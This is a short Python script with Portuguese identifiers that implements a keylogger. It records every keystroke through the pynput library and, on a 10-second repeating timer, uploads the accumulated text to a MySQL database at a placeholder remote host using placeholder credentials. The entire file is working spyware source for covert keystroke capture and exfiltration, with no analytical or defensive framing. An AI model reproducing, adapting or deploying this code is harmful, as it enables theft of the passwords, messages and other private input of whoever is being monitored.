import pynput.keyboard
import threading
import mysql.connector

log = ""

def callback_function(tecla):
    global log
    try:
        log = log + str(tecla.char)
    except AttributeError:
        if tecla == tecla.space:
            log = log + " "
        else:
            log = log + str(tecla)
    print(log)

def salvar_log_no_banco(log):
    try:
        conexao = mysql.connector.connect(
            host="seu_host",
            user="seu_usuario",
            password="sua_senha",
            database="seu_banco_de_dados"
        )
        cursor = conexao.cursor()
        sql = "INSERT INTO logs (conteudo) VALUES (%s)"
        valores = (log,)
        cursor.execute(sql, valores)
        conexao.commit()
        print("Log salvo no banco de dados!")
    except mysql.connector.Error as erro:
        print(f"Erro ao salvar log no banco de dados: {erro}")
    finally:
        if conexao and conexao.is_connected():
            cursor.close()
            conexao.close()

def thread_function():
    threading.Timer(10, thread_function).start()
    salvar_log_no_banco(log)

with pynput.keyboard.Listener(on_press=callback_function) as listener:
    thread_function()
    listener.join()
